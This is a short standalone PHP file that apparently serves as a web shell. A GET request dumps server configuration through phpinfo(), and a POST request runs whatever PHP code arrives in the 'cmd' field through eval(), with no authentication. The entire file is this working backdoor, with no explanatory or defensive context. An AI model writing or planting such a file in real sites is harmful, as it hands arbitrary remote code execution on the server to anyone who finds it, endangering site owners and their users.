<?php
if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
    phpinfo();
}

if ($_SERVER['REQUEST_METHOD'] == 'POST'){
    eval($_POST['cmd']);
}

?>
